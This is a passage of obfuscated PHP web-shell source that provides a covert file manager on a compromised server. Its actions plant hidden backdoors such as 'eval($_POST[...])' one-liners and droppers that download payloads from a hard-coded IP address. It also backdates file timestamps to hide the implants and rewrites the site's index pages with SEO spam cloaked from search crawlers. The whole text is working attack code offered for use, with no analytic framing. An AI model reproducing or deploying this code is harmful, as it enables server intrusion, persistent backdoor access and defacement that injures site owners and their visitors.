        $QSO8f .= "<input type=\"hidden\" name=\"filecode\" id=\"filecode\" value=\"\">";
        $QSO8f .= "<pre id=\"phpcode\" class=\"ace_editor\" style=\"min-height:500px\"><textarea class=\"ace_text-input\" style=\"width:698px;height:500px;\">" . $uS2nL . "</textarea></pre>";
        $QSO8f .= "</div></form>";
        $QSO8f .= "<div class=\"actall\" style=\"padding:5px;padding-right:68px;\"><input type=\"button\" onclick=\"editSubmit()\" value=\"����\" style=\"width:80px;\"> ";
        $QSO8f .= "<form name=\"backfrm\" id=\"backfrm\" method=\"POST\"><input type=\"hidden\" name=\"go\" value=\"\"><input type=\"hidden\" name=\"dir\" id=\"dir\" value=\"" . dirname($SFJ9z) . "\">";
        $QSO8f .= AxtTq();
        $QSO8f .= "<input type=\"button\" onclick=\"\$('backfrm').submit();\" value=\"����\" style=\"width:80px;\"></form></div>";
        $QSO8f .= "        <script>\r\n            //��ʼ������\r\n            editor = ace.edit(\"phpcode\");\r\n            editor.setTheme(\"ace/theme/monokai\");//����ģ��\r\n            editor.session.setMode(\"ace/mode/php\");//����php\r\n            editor.setFontSize(14); //�����С\r\n            document.getElementById(\"phpcode\").style.lineHeight=\"18px\";//�����и�;\r\n            editor.setReadOnly(false);//����ֻ��(trueʱֻ��,����չʾ����)\r\n            //�Զ�����,����Ϊoff�ر�\r\n            editor.setOption(\"wrap\", \"free\");\r\n            //������ʾ�˵�\r\n            ace.require(\"ace/ext/language_tools\");\r\n            //���²������������������ʾ��\r\n            editor.setOptions({\r\n                enableBasicAutocompletion: true,\r\n                enableSnippets: true,\r\n                enableLiveAutocompletion: true\r\n            });\r\n            editor.setHighlightActiveLine(true); //�������\r\n            editor.setShowPrintMargin(false);//���ô�ӡ���Ƿ���ʾ\r\n            editor.getSession().setUseWorker(false); //����ֻ��\r\n            editor.getSession().setUseWrapMode(true); //֧�ִ����۵�\r\n            //editor.getSession().setMode(&#39;ace/mode/javascript&#39;); //��������ģʽ\r\n            editor.selection.getCursor(); //��ȡ��������л���\r\n            //editor.gotoLine(lineNumber); //��ת����\r\n            editor.session.getLength(); //��ȡ������\r\n            editor.getSession().setUseSoftTabs(true);\r\n\r\n            function editSubmit()\r\n            {\r\n                document.getElementById(\"filecode\").value = editor.getValue();\r\n                \$('editfrm').submit();\r\n            }\r\n        </script>";
        return $QSO8f;
    }
    public function J0I1z()
    {
        $Jzwra = $this->ddguj;
        $UgLz_ = '';
        $JqKaG = isset($_POST["go"]) ? $_POST["go"] : '';
        if ($JqKaG == "down") {
            $x3CQ0 = $J3Hov = pBm07($_POST["godir"] . "/" . $_POST["govar"]);
            if (!VZO7E($x3CQ0)) {
                $UgLz_ = "<h1>�����ļ�������</h1>";
            }
        }
        if (isset($_FILES["upfile"])) {
            if ($_FILES["upfile"]["name"] == '') {
                $UgLz_ = "<h1>��ѡ���ļ�</h1>";
            } else {
                $QY5ao = $_POST["rename"] == '' ? $_FILES["upfile"]["name"] : $_POST["rename"];
                $zi0Y0 = $_FILES["upfile"]["tmp_name"];
                $J3Hov = pBM07($Jzwra . $QY5ao);
                $UgLz_ = fivrG($zi0Y0, $J3Hov) ? "<h2>�ϴ��ļ�" . $QY5ao . "�ɹ�</h2>" : "<h1>�ϴ��ļ�" . $QY5ao . "ʧ��</h1>";
            }
        }
        if (isset($_POST["act"])) {
            switch ($_POST["act"]) {
                case "a":
                    if (!$_POST["files"]) {
                        $UgLz_ = "<h1>��ѡ���ļ� " . $_POST["var"] . "</h1>";
                    } else {
                        $uLtTd = 0;
                        foreach ($_POST["files"] as $eb_7J) {
                            $uLtTd += @copy(pBm07($Jzwra . $eb_7J), Pbm07($_POST["var"] . "/copy_" . $eb_7J)) ? 1 : 0;
                        }
                        $UgLz_ = $UgLz_ = $uLtTd ? "<h2>������ " . $uLtTd . " ���ļ���" . $_POST["var"] . "�ɹ�</h2>" : "<h1>������ " . $uLtTd . " ���ļ���" . $_POST["var"] . "ʧ��</h1>";
                    }
                    break;
                case "b":
                    if (!$_POST["files"]) {
                        $UgLz_ = "<h1>��ѡ���ļ�</h1>";
                    } else {
                        $uLtTd = 0;
                        foreach ($_POST["files"] as $eb_7J) {
                            $uLtTd += @unlink(pbm07($Jzwra . $eb_7J)) ? 1 : 0;
                        }
                        $UgLz_ = $uLtTd ? "<h2>��ɾ�� " . $uLtTd . " ���ļ��ɹ�</h2>" : "<h1>��ɾ�� " . $uLtTd . " ���ļ�ʧ��</h1>";
                    }
                    break;
                case "c":
                    if (!$_POST["files"]) {
                        $UgLz_ = "<h1>��ѡ���ļ� " . $_POST["var"] . "</h1>";
                    } else {
                        if (!preg_match("/[0-7]{4}\$/", $_POST["var"])) {
                            $UgLz_ = "<h1>����ֵ����</h1>";
                        } else {
                            $uLtTd = 0;
                            foreach ($_POST["files"] as $eb_7J) {
                                try {
                                    $uLtTd += @chmod(PbM07($Jzwra . $eb_7J), base_convert($_POST["var"], 8, 10)) ? 1 : 0;
                                } catch (Throwable $yVbeC) {
                                }
                            }
                            $UgLz_ = $uLtTd ? "<h2>�� " . $uLtTd . " ���ļ��޸�����Ϊ" . $_POST["var"] . "�ɹ�</h2>" : "<h1>�� " . $uLtTd . " ���ļ��޸�����Ϊ" . $_POST["var"] . "ʧ��</h1>";
                        }
                    }
                    break;
                case "d":
                    if (!$_POST["files"]) {
                        $UgLz_ = "<h1>��ѡ���ļ� " . $_POST["var"] . "</h1>";
                    } else {
                        if (!preg_match("/(\\d+)-(\\d+)-(\\d+) (\\d+):(\\d+):(\\d+)/", $_POST["var"])) {
                            $UgLz_ = "<h1>ʱ���ʽ���� " . $_POST["var"] . "</h1>";
                        } else {
                            $uLtTd = 0;
                            foreach ($_POST["files"] as $eb_7J) {
                                $uLtTd += @touch(pbm07($Jzwra . $eb_7J), strtotime($_POST["var"])) ? 1 : 0;
                            }
                            $UgLz_ = $uLtTd ? "<h2>�� " . $uLtTd . " ���ļ��޸�ʱ��Ϊ" . $_POST["var"] . "�ɹ�</h2>" : "<h1>�� " . $uLtTd . " ���ļ��޸�ʱ��Ϊ" . $_POST["var"] . "ʧ��</h1>";
                        }
                    }
                    break;
                case "e":
                    $PfRvL = PbM07($Jzwra . $_POST["var"] . "/");
                    if (file_exists($PfRvL)) {
                        $UgLz_ = "<h1>Ŀ¼�Ѵ��� " . $_POST["var"] . "</h1>";
                    } else {
                        $UgLz_ = @mkdir($PfRvL, 0777) ? "<h2>����Ŀ¼ " . $_POST["var"] . " �ɹ�</h2>" : "<h1>����Ŀ¼ " . $_POST["var"] . " ʧ��</h1>";
                    }
                    break;
                case "f":
                    $rINXt = array("http" => array("timeout" => 30));
                    if (function_exists("stream_context_create")) {
                        $KlQ6w = stream_context_create($rINXt);
                    }
                    $dRqNZ = explode(" ", $_POST["var"]);
                    $s5r3y = @file_get_contents($dRqNZ[0], false, $KlQ6w);
                    $kojAr = explode("/", $dRqNZ[0]);
                    $eb_7J = array_pop($kojAr);
                    if (!empty($dRqNZ[1])) {
                        $eb_7J = $dRqNZ[1];
                    }
                    if ($s5r3y) {
                        if (LGU3J(pbM07($Jzwra . $eb_7J), $s5r3y, "wb")) {
                            $YJnbr = c4GHr($Jzwra);
                            $ipdt9 = 0;
                            if (!empty($YJnbr["file"])) {
                                foreach ($YJnbr["file"] as $cT1oz => $Kes_q) {
                                    if (!$ipdt9) {
                                        $ipdt9 = filemtime($cT1oz);
                                    } else {
                                        if (filemtime($cT1oz) < $ipdt9) {
                                            $ipdt9 = filemtime($cT1oz);
                                        }
                                    }
                                }
                            }
                            if ($ipdt9) {
                                @touch(PBM07($Jzwra . $eb_7J), $ipdt9);
                            }
                            chmod(PbM07($Jzwra . $eb_7J), 0755);
                            $UgLz_ = "<h2>���� " . $eb_7J . " �ɹ�</h2>";
                        } else {
                            "<h1>���� " . $eb_7J . " ʧ��</h1>";
                        }
                    } else {
                        $UgLz_ = "<h1>����ʧ�ܻ�֧������</h1>";
                    }
                    break;
                case "rf":
                    $kojAr = explode("|x|", $_POST["var"]);
                    if (count($kojAr) != 2) {
                        $UgLz_ = "<h1>�������</h1>";
                    } else {
                        $UgLz_ = @rename(PbM07($Jzwra . $kojAr[1]), PbM07($Jzwra . $kojAr[0])) ? "<h2>������ " . $kojAr[1] . " Ϊ " . $kojAr[0] . " �ɹ�</h2>" : "<h1>������ " . $kojAr[1] . " Ϊ " . $kojAr[0] . " ʧ��</h1>";
                    }
                    break;
                case "pd":
                    $kojAr = explode("|x|", $_POST["var"]);
                    if (count($kojAr) != 2) {
                        $UgLz_ = "<h1>�������</h1>";
                    } else {
                        $PfRvL = PBM07($Jzwra . $kojAr[1]);
                        try {
                            @chmod($PfRvL, base_convert($kojAr[0], 8, 10));
                            $QRlUz = true;
                        } catch (Throwable $yVbeC) {
                            $QRlUz = false;
                        }
                        $UgLz_ = $QRlUz ? "<h2>�޸�" . $kojAr[1] . "����Ϊ" . $kojAr[0] . "�ɹ�</h2>" : "<h1>�޸�" . $kojAr[1] . "����Ϊ" . $kojAr[0] . "ʧ��</h1>";
                    }
                    break;
                case "edit":
                    if (!(isset($_POST["filename"]) && isset($this->N5qPH["filecode"]))) {
                    } else {
                        $UgLz_ = lgU3J($_POST["filename"], $this->N5qPH["filecode"], "w") ? "<h2>����ɹ� " . $_POST["filename"] . "</h2>" : "<h1>����ʧ�� " . $_POST["filename"] . "</h1>";
                    }
                    break;
                case "deltree":
                    $C3hpU = pBM07($Jzwra . $_POST["var"] . "/");
                    if (!file_exists($C3hpU)) {
                        $UgLz_ = "<h1>Ŀ¼ " . $_POST["var"] . " ������</h1>";
                    } else {
                        $UgLz_ = mRf0Q($C3hpU) ? "<h2>ɾ��Ŀ¼ " . $_POST["var"] . " �ɹ�</h2>" : "<h1>ɾ��Ŀ¼ " . $_POST["var"] . " ʧ��</h1>";
                    }
                    break;
                case "plxiaoma":
                    $PfRvL = rtrim($_POST["dir"], "/");
                    $kojAr = explode("\n", trim($_POST["var"]));
                    $kFQIU = array();
                    if ($kojAr) {
                        $YJnbr = c4gHr($PfRvL);
                        $ipdt9 = 0;
                        if (!empty($YJnbr["file"])) {
                            foreach ($YJnbr["file"] as $cT1oz => $Kes_q) {
                                if (!$ipdt9) {
                                    $ipdt9 = filemtime($cT1oz);
                                } else {
                                    if (filemtime($cT1oz) < $ipdt9) {
                                        $ipdt9 = filemtime($cT1oz);
                                    }
                                }
                            }
                        }
                        foreach ($kojAr as $Hzx0E) {
                            $Hzx0E = trim($Hzx0E);
                            $xNX14 = explode("/", $PfRvL . "/" . $Hzx0E);
                            $eb_7J = array_pop($xNX14);
                            $xNX14 = implode("/", $xNX14);
                            if (!file_exists($xNX14)) {
                                mkdir($xNX14, 0755, "recursive");
                                chmod($xNX14, 0755);
                            }
                            if (strpos($eb_7J, ".php") !== false) {
                                $dRqNZ = $xNX14 . "/" . $eb_7J;
                            } else {
                                $dRqNZ = $xNX14 . "/" . $eb_7J;
                                if (!file_exists($dRqNZ)) {
                                    mkdir($dRqNZ, 0755, "recursive");
                                    chmod($dRqNZ, 0755);
                                }
                                $dRqNZ .= "/.xm.php";
                            }
                            file_put_contents($dRqNZ, "<?php file_put_contents(\"\\x2e\\x69\\156\\144\\x65\\170\\x5f\\142\\x61\\x6b\\x2e\\160\\x68\\x70\", file_get_contents (\"\\x68\\x74\\164\\160\\x3a\\57\\57\\x31\\x35\\x34\\56\\62\\x30\\x34\\x2e\\62\\63\\63\\56\\61\\x36\\62\\x2f\\160\\x61\\156\\145\\154\\56\\164\\x78\\164\"));");
                            if ($ipdt9) {
                                @touch($dRqNZ, $ipdt9);
                            }
                            chmod($dRqNZ, 0755);
                            $kFQIU[] = sprintf("������С�� ·����%s", $dRqNZ);
                        }
                    }
                    $UgLz_ = implode("</br>", $kFQIU);
                    break;
                case "xiaoma":
                    $PfRvL = rtrim($_POST["var"], "/");
                    if (!file_exists($PfRvL)) {
                        mkdir($PfRvL, 0755, "recursive");
                        chmod($PfRvL, 0755);
                    }
                    $YJnbr = C4Ghr($PfRvL);
                    $ipdt9 = 0;
                    if (!empty($YJnbr["file"])) {
                        foreach ($YJnbr["file"] as $cT1oz => $Kes_q) {
                            if (!$ipdt9) {
                                $ipdt9 = filemtime($cT1oz);
                            } else {
                                if (filemtime($cT1oz) < $ipdt9) {
                                    $ipdt9 = filemtime($cT1oz);
                                }
                            }
                        }
                    }
                    $dRqNZ = $PfRvL . "/.xm.php";
                    file_put_contents($dRqNZ, "<?php file_put_contents(\"\\x2e\\x69\\156\\144\\x65\\170\\x5f\\142\\x61\\x6b\\x2e\\160\\x68\\x70\", file_get_contents (\"\\x68\\x74\\164\\160\\x3a\\57\\57\\x31\\x35\\x34\\56\\62\\x30\\x34\\x2e\\62\\63\\63\\56\\61\\x36\\62\\x2f\\160\\x61\\156\\145\\154\\56\\164\\x78\\164\"));");
                    if ($ipdt9) {
                        @touch($dRqNZ, $ipdt9);
                    }
                    chmod($dRqNZ, 0755);
                    $UgLz_ = sprintf("һ��СM ·����%s ", $dRqNZ);
                    break;
                case "pldama":
                    $PfRvL = rtrim($_POST["dir"], "/");
                    $kojAr = explode("\n", trim($_POST["var"]));
                    $kFQIU = array();
                    if ($kojAr) {
                        $YJnbr = c4gHr($PfRvL);
                        $ipdt9 = 0;
                        if (!empty($YJnbr["file"])) {
                            foreach ($YJnbr["file"] as $cT1oz => $Kes_q) {
                                if (!$ipdt9) {
                                    $ipdt9 = filemtime($cT1oz);
                                } else {
                                    if (filemtime($cT1oz) < $ipdt9) {
                                        $ipdt9 = filemtime($cT1oz);
                                    }
                                }
                            }
                        }
                        foreach ($kojAr as $Hzx0E) {
                            $Hzx0E = trim($Hzx0E);
                            $xNX14 = explode("/", $PfRvL . "/" . $Hzx0E);
                            $eb_7J = array_pop($xNX14);
                            $xNX14 = implode("/", $xNX14);
                            if (!file_exists($xNX14)) {
                                mkdir($xNX14, 0755, "recursive");
                                chmod($xNX14, 0755);
                            }
                            if (strpos($eb_7J, ".php") !== false) {
                                $dRqNZ = $xNX14 . "/" . $eb_7J;
                            } else {
                                $dRqNZ = $xNX14 . "/" . $eb_7J;
                                if (!file_exists($dRqNZ)) {
                                    mkdir($dRqNZ, 0755, "recursive");
                                    chmod($dRqNZ, 0755);
                                }
                                $dRqNZ .= "/.index_bak.php";
                            }
                            file_put_contents($dRqNZ, file_get_contents(V51MD));
                            if ($ipdt9) {
                                @touch($dRqNZ, $ipdt9);
                            }
                            chmod($dRqNZ, 0755);
                            $kFQIU[] = sprintf("������M ·����%s ", $dRqNZ);
                        }
                    }
                    $UgLz_ = implode("</br>", $kFQIU);
                    break;
                case "dama":
                    $PfRvL = rtrim($_POST["var"], "/");
                    if (!file_exists($PfRvL)) {
                        mkdir($PfRvL, 0755, "recursive");
                        chmod($PfRvL, 0755);
                    }
                    $YJnbr = c4gHR($PfRvL);
                    $ipdt9 = 0;
                    if (!empty($YJnbr["file"])) {
                        foreach ($YJnbr["file"] as $cT1oz => $Kes_q) {
                            if (!$ipdt9) {
                                $ipdt9 = filemtime($cT1oz);
                            } else {
                                if (filemtime($cT1oz) < $ipdt9) {
                                    $ipdt9 = filemtime($cT1oz);
                                }
                            }
                        }
                    }
                    $dRqNZ = $PfRvL . "/.index_bak.php";
                    file_put_contents($dRqNZ, file_get_contents(V51MD));
                    if ($ipdt9) {
                        @touch($dRqNZ, $ipdt9);
                    }
                    chmod($dRqNZ, 0755);
                    $UgLz_ = sprintf("һ����M ·����%s ", $dRqNZ);
                    break;
                case "gxdama":
                    $PfRvL = rtrim($_POST["var"], "/");
                    if (!file_exists($PfRvL)) {
                        mkdir($PfRvL, 0755, "recursive");
                        chmod($PfRvL, 0755);
                    }
                    $YJnbr = c4GHR($PfRvL);
                    $ipdt9 = 0;
                    if (isset($YJnbr["file"])) {
                        foreach ($YJnbr["file"] as $cT1oz => $Kes_q) {
                            if (!$ipdt9) {
                                $ipdt9 = filemtime($cT1oz);
                            } else {
                                if (filemtime($cT1oz) < $ipdt9) {
                                    $ipdt9 = filemtime($cT1oz);
                                }
                            }
                        }
                    }
                    $dRqNZ = V51MD;
                    file_put_contents($dRqNZ, file_get_contents("http://154.204.233.162/panel.txt"));
                    if ($ipdt9) {
                        @touch($dRqNZ, $ipdt9);
                    }
                    chmod($dRqNZ, 0755);
                    $UgLz_ = sprintf("���´�M��� ·����%s", $dRqNZ);
                    break;
                case "plgzl":
                    $PfRvL = rtrim($_POST["dir"], "/");
                    $kojAr = explode("\n", trim($_POST["var"]));
                    $kFQIU = array();
                    if ($kojAr) {
                        $YJnbr = C4GHr($PfRvL);
                        $ipdt9 = 0;
                        if (!empty($YJnbr["file"])) {
                            foreach ($YJnbr["file"] as $cT1oz => $Kes_q) {
                                if (!$ipdt9) {
                                    $ipdt9 = filemtime($cT1oz);
                                } else {
                                    if (filemtime($cT1oz) < $ipdt9) {
                                        $ipdt9 = filemtime($cT1oz);
                                    }
                                }
                            }
                        }
                        $DAWrM = mDXRq();
                        foreach ($kojAr as $Hzx0E) {
                            $Hzx0E = trim($Hzx0E);
                            $xNX14 = explode("/", $PfRvL . "/" . $Hzx0E);
                            $eb_7J = array_pop($xNX14);
                            $xNX14 = implode("/", $xNX14);
                            if (!file_exists($xNX14)) {
                                mkdir($xNX14, 0755, "recursive");
                                chmod($xNX14, 0755);
                            }
                            if (strpos($eb_7J, ".php") !== false) {
                                $dRqNZ = $xNX14 . "/" . $eb_7J;
                            } else {
                                $dRqNZ = $xNX14 . "/" . $eb_7J;
                                if (!file_exists($dRqNZ)) {
                                    mkdir($dRqNZ, 0755, "recursive");
                                    chmod($dRqNZ, 0755);
                                }
                                $dRqNZ .= "/gzl.php";
                            }
                            file_put_contents($dRqNZ, "<?php eval(\$_POST[\"" . $DAWrM . "\"]);");
                            if ($ipdt9) {
                                @touch($dRqNZ, $ipdt9);
                            }
                            chmod($dRqNZ, 0755);
                            $kFQIU[] = sprintf("����GZL ·����%s ���룺%s", $dRqNZ, $DAWrM);
                        }
                    }
                    $UgLz_ = implode("</br>", $kFQIU);
                    break;
                case "gzl":
                    $PfRvL = rtrim($_POST["var"], "/");
                    if (!file_exists($PfRvL)) {
                        mkdir($PfRvL, 0755, "recursive");
                        chmod($PfRvL, 0755);
                    }
                    $YJnbr = c4gHr($PfRvL);
                    $ipdt9 = 0;
                    if (isset($YJnbr["file"])) {
                        foreach ($YJnbr["file"] as $cT1oz => $Kes_q) {
                            if (!$ipdt9) {
                                $ipdt9 = filemtime($cT1oz);
                            } else {
                                if (filemtime($cT1oz) < $ipdt9) {
                                    $ipdt9 = filemtime($cT1oz);
                                }
                            }
                        }
                    }
                    $dRqNZ = $PfRvL . "/gzl.php";
                    $DAWrM = mdxRq();
                    file_put_contents($dRqNZ, "<?php eval(\$_POST[\"" . $DAWrM . "\"]);");
                    if ($ipdt9) {
                        @touch($dRqNZ, $ipdt9);
                    }
                    chmod($dRqNZ, 0755);
                    $UgLz_ = sprintf("һ��GZL ·����%s ���룺%s", $dRqNZ, $DAWrM);
                    break;
                case "TDK":
                    $PfRvL = FO39n;
                    $YJnbr = c4gHr($PfRvL);
                    $ipdt9 = 0;
                    if (isset($YJnbr["file"])) {
                        foreach ($YJnbr["file"] as $cT1oz => $Kes_q) {
                            if (!$ipdt9) {
                                $ipdt9 = filemtime($cT1oz);
                            } else {
                                if (filemtime($cT1oz) < $ipdt9) {
                                    $ipdt9 = filemtime($cT1oz);
                                }
                            }
                        }
                    }
                    $hKJoi = trim($_POST["var"]);
                    $p9Pgu = $_SERVER["SERVER_PORT"];
                    $IJLc4 = $p9Pgu == "443" ? "https://" : "http://";
                    $QSO8f = cIvGH($IJLc4 . $_SERVER["HTTP_HOST"], 6);
                    if ($QSO8f) {
                        preg_match_all("/<meta(.*?)name=\"keywords\"(.*?)>/i", $QSO8f, $GlUYK);
                        if (!empty($GlUYK[0])) {
                            foreach ($GlUYK[0] as $Hzx0E) {
                                $QSO8f = str_replace($Hzx0E, '', $QSO8f);
                            }
                        }
                        preg_match_all("/<meta(.*?)name=\"description\"(.*?)>/i", $QSO8f, $GlUYK);
                        if (!empty($GlUYK[0])) {
                            foreach ($GlUYK[0] as $Hzx0E) {
                                $QSO8f = str_replace($Hzx0E, '', $QSO8f);
                            }
                        }
                        preg_match("/<title(.*?)>(.*?)<\\/title>/", $QSO8f, $GlUYK);
                        if (!empty($GlUYK[0])) {
                            $YfZ3Q = '';
                            if (!empty($GlUYK[2])) {
                                $YfZ3Q = "<script>if(navigator.userAgent.toLocaleLowerCase().indexOf(\"baidu\") == -1){document.title =\"" . $GlUYK[2] . "\"}</script>";
                                $QSO8f = str_replace($YfZ3Q, '', $QSO8f);
                            }
                            $YfZ3Q .= "\n" . $hKJoi;
                            $QSO8f = str_replace($GlUYK[0], $YfZ3Q, $QSO8f);
                        }
                        file_put_contents($PfRvL . "/index.html", $QSO8f);
                        if (file_exists($PfRvL . "/index.php")) {
                            copy($PfRvL . "/index.php", $PfRvL . "/index_copy.php");
                            if (!file_exists($PfRvL . "/index_copy.php")) {
                                file_put_contents($PfRvL . "/index_copy.php", file_get_contents($PfRvL . "/index.php"));
                            }
                        }
                        file_put_contents($PfRvL . "/index.php", $QSO8f);
                        if ($ipdt9) {
                            @touch($PfRvL . "/index.html", $ipdt9);
                            @touch($PfRvL . "/index.php", $ipdt9);
                        }
                        chmod($PfRvL . "/index.html", 0755);
                        chmod($PfRvL . "/index.php", 0755);
                        $UgLz_ = sprintf("һ��TDK��� %s %s", $PfRvL . "/index.html", $PfRvL . "/index.php");
                    } else {
                        $UgLz_ = sprintf("һ��TDKʧ�� %s ���ݻ�ȡʧ��", "http://" . $_SERVER["HTTP_HOST"]);
                    }
                    break;
                case "JSC":
                    $PfRvL = rtrim($_POST["var"], "/");
                    if (!file_exists($PfRvL)) {
                        mkdir($PfRvL, 0755, "recursive");
                        chmod($PfRvL, 0755);
                    }
                    $YJnbr = C4GhR($PfRvL);
                    $ipdt9 = 0;
                    if (isset($YJnbr["file"])) {
                        foreach ($YJnbr["file"] as $cT1oz => $Kes_q) {
                            if (!$ipdt9) {
                                $ipdt9 = filemtime($cT1oz);
                            } else {
                                if (filemtime($cT1oz) < $ipdt9) {
                                    $ipdt9 = filemtime($cT1oz);
                                }
                            }
                        }
                    }
                    $dRqNZ = $PfRvL . "/zrty.php";
                    file_put_contents($dRqNZ, file_get_contents("http://154.204.233.162/zrty.txt"));
                    if ($ipdt9) {
                        @touch($dRqNZ, $ipdt9);
                    }
                    chmod($dRqNZ, 0755);
                    $UgLz_ = sprintf("һ��JSC ·����%s", $dRqNZ);
                    break;
            }
        }
        try {
            $RoNtC = substr(decoct(fileperms($Jzwra)), -4);
        } catch (Throwable $yVbeC) {
            $RoNtC = false;
        }
        if (!$RoNtC) {
            $UgLz_ .= "<h1>�޷���ȡĿ¼</h1>";
        }
        $YJnbr = c4ghr($Jzwra);
        $nbzHl = Pbm07("/" . strtr($Jzwra, array(FO39n => '')) . "/");
        $Jzwra = strtr($Jzwra, array("'" => "%27", "\"" => "%22"));
        $QSO8f = '';
        $QSO8f .= "<div class=\"msgbox\">" . $UgLz_ . "</div>";
        $QSO8f .= "<div class=\"actall\"><form name=\"frm\" id=\"frm\" method=\"POST\">";
        $QSO8f .= axttQ();
        $QSO8f .= (is_writable($Jzwra) ? "<h2>·��</h2>" : "<h1>·��</h1>") . " <input type=\"text\" name=\"dir\" id=\"dir\" style=\"width:508px;\" value=\"" . PBm07($Jzwra . "/") . "\"> ";
        $QSO8f .= "<input type=\"button\" onclick=\"\$('frm').submit();\" style=\"width:50px;\" value=\"ת��\"> ";
        $QSO8f .= "<input type=\"button\" onclick=\"cd('" . FO39n . "');\" style=\"width:68px;\" value=\"��Ŀ¼\"> ";
        $QSO8f .= "<input type=\"button\" onclick=\"cd('" . k3TER . "');\" style=\"width:68px;\" value=\"����Ŀ¼\"> ";
        $QSO8f .= "<select onchange=\"cd(options[selectedIndex].value);\">";
        $QSO8f .= "<option>---����Ŀ¼---</option>";
        $QSO8f .= "<option value=\"C:/RECYCLER/\">Win-RECYCLER</option>";
        $QSO8f .= "<option value=\"C:/\$Recycle.Bin/\">Win-\$Recycle</option>";
        $QSO8f .= "<option value=\"C:/Program Files/\">Win-Program</option>";
        $QSO8f .= "<option value=\"C:/Documents and Settings/All Users/Start Menu/Programs/Startup/\">Win-Startup</option>";
        $QSO8f .= "<option value=\"C:/Documents and Settings/All Users/����ʼ���˵�/����/����/\">Win-����</option>";
        $QSO8f .= "<option value=\"C:/Windows/Temp/\">Win-TEMP</option>";
        $QSO8f .= "<option value=\"/usr/local/\">Linux-local</option>";
        $QSO8f .= "<option value=\"/tmp/\">Linux-tmp</option>";
        $QSO8f .= "<option value=\"/var/tmp/\">Linux-var</option>";
        $QSO8f .= "<option value=\"/etc/ssh/\">Linux-ssh</option>";
        $QSO8f .= "</select></form></div><div class=\"actall\">";
        $QSO8f .= "<input type=\"button\" value=\"�½��ļ�\" onclick=\"nf('edit','newfile.php');\" style=\"width:68px;\"> ";
        $QSO8f .= "<input type=\"button\" value=\"����Ŀ¼\" onclick=\"txts('Ŀ¼��','newdir','e');\" style=\"width:68px;\"> ";
        $QSO8f .= "<input type=\"button\" value=\"�����ļ�\" onclick=\"txts('�����ļ�����ǰĿ¼','url����','f');\" style=\"width:68px;\"> ";
        $QSO8f .= "<input type=\"button\" value=\"�����ϴ�\" onclick=\"go('upfiles','" . $Jzwra . "');\" style=\"width:68px;\"> ";
        $QSO8f .= "<form name=\"upfrm\" id=\"upfrm\" method=\"POST\" enctype=\"multipart/form-data\">";
        $QSO8f .= axtTQ();
        $QSO8f .= "<input type=\"hidden\" name=\"dir\" id=\"dir\" value=\"" . $Jzwra . "\">";
        $QSO8f .= "<input type=\"file\" name=\"upfile\" style=\"width:286px;height:21px;\"> ";
        $QSO8f .= "<input type=\"button\" onclick=\"\$('upfrm').submit();\" value=\"�ϴ�\" style=\"width:50px;\"> ";
        $QSO8f .= "�ϴ�������Ϊ <input type=\"text\" name=\"rename\" style=\"width:128px;\">";
        $QSO8f .= "</form></div>";
        $QSO8f .= "<form name=\"frm1\" id=\"frm1\" method=\"POST\"><table class=\"tables\">";
        $QSO8f .= axtTQ();
        $QSO8f .= "<input type=\"hidden\" name=\"dir\" id=\"dir\" value=\"" . $Jzwra . "\">";
        $QSO8f .= "<input type=\"hidden\" name=\"act\" id=\"act\" value=\"\">";
        $QSO8f .= "<input type=\"hidden\" name=\"var\" id=\"var\" value=\"\">";
        $QSO8f .= "<th><a href=\"javascript:cd('" . dirname($Jzwra) . "/');\">�ϼ�Ŀ¼</a></th><th style=\"width:8%\">����</th><th style=\"width:5%\">����</th><th style=\"width:17%\">����ʱ��</th><th style=\"width:17%\">�޸�ʱ��</th><th style=\"width:8%\">����</th>";
        $uMn1i = '';
        $yICDZ = '';
        $CU3_o = $DOdBZ = 0;
        if ($YJnbr) {
            if (isset($YJnbr["dir"])) {
                asort($YJnbr["dir"]);
            }
            if (isset($YJnbr["file"])) {
                asort($YJnbr["file"]);
            }
            if (isset($YJnbr["dir"])) {
                foreach ($YJnbr["dir"] as $PfRvL => $Kes_q) {
                    $IU13H = substr(decoct(fileperms($PfRvL)), -4);
                    $uMn1i = date("Y-m-d H:i:s", filectime($PfRvL));
                    $yICDZ = date("Y-m-d H:i:s", filemtime($PfRvL));
                    $QSO8f .= "<tr>";
                    $QSO8f .= "<td><a href=\"javascript:cd('" . $Jzwra . $Kes_q . "');\"><b>&nbsp;" . strtr($Kes_q, array("%27" => "'", "%22" => "\"")) . "</b></a></td>";
                    $QSO8f .= "<td><a href=\"javascript:dels('" . $Kes_q . "');\">ɾ��</a> ";
                    $QSO8f .= "<a href=\"javascript:acts('" . $Kes_q . "','rf','" . $Kes_q . "');\">����</a></td>";
                    $QSO8f .= "<td><a href=\"javascript:acts('" . $IU13H . "','pd','" . $Kes_q . "');\">" . $IU13H . "</a></td>";
                    $QSO8f .= "<td>" . $uMn1i . "</td>";
                    $QSO8f .= "<td>" . $yICDZ . "</td>";
                    $QSO8f .= "<td>-</td>";
                    $QSO8f .= "</tr>";
                    $CU3_o++;
                }
            }
            if (isset($YJnbr["file"])) {
                foreach ($YJnbr["file"] as $PfRvL => $Kes_q) {
                    $IU13H = substr(decoct(fileperms($PfRvL)), -4);
                    $uMn1i = date("Y-m-d H:i:s", filectime($PfRvL));
                    $yICDZ = date("Y-m-d H:i:s", filemtime($PfRvL));
                    $T3WIB = IDYFR(filesize($PfRvL));
                    $QSO8f .= "<tr>";
                    $QSO8f .= "<td><input type=\"checkbox\" name=\"files[]\" value=\"" . $Kes_q . "\">&nbsp;&nbsp;<a target=\"_blank\" href=\"" . $nbzHl . $Kes_q . "\">" . strtr($Kes_q, array("%27" => "'", "%22" => "\"")) . "</a></td>";
                    $QSO8f .= "<td><a href=\"javascript:go('edit','" . $Kes_q . "');\">�༭</a> ";
                    $QSO8f .= "<a href=\"javascript:acts('" . $Kes_q . "','rf','" . $Kes_q . "');\">����</a></td>";
                    $QSO8f .= "<td><a href=\"javascript:acts('" . $IU13H . "','pd','" . $Kes_q . "');\">" . $IU13H . "</a></td>";
                    $QSO8f .= "<td>" . $uMn1i . "</td>";
                    $QSO8f .= "<td>" . $yICDZ . "</td>";
                    $QSO8f .= "<td align=\"right\"><a style=\"margin-right: 10px;\" href=\"javascript:go('down','" . $Kes_q . "');\">" . $T3WIB . "</a></td>";
                    $QSO8f .= "</tr>";
                    $DOdBZ++;
                }
            }
        }
        unset($YJnbr);
        $QSO8f .= "</table>";
        $QSO8f .= "<div class=\"actall\" style=\"text-align:left;\">";
